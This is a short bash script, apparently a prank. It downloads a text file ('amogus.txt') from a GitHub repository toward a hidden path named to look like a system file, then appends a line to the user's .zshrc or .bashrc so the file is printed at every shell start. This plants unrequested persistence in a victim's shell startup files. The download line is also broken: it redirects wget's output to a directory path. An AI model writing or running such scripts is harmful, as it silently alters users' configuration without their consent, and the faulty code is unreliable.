#!/bin/bash

TARGETPATH=~/.system.d_file

wget https://raw.githubusercontent.com/romainpanno/bonchance/master/amogus.txt >> $TARGETPATH/

if [[ -n "$(echo $SHELL | grep 'zsh')" ]]; then
    echo -e "\ncat $TARGETPATH" >> ~/.zshrc
elif [[ -n "$(echo $SHELL | grep 'bash')" ]]; then
    echo -e "\ncat $TARGETPATH" >> ~/.bashrc
fi
